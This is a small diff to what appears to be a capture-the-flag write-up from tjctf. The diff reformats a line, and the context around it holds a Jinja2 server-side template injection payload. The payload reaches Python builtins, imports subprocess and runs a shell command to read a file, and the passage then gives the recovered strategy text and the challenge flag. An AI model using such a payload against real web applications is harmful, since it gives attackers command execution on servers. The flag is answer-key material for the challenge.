@@ -22,5 +22,6 @@ Can be used to import a module. Combining this with subprocess we get a final pa
 ```javascript
 {{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')|attr('getoutput')('cat strategyguide.txt')}}
 ```
-and reading the file gives us: Best formation that wins every time: `DDDDD DLLLD DLHLD DLLLD DDDDD Key: D=Drone L=Landscaper H=HQ Beginning of game strategy`: 
+and reading the file gives us: Best formation that wins every time:  
+`DDDDD DLLLD DLHLD DLLLD DDDDD Key: D=Drone L=Landscaper H=HQ Beginning of game strategy`: 
 #### tjctf{c0ng3n1al_500iq_str4ts_ez_dub}
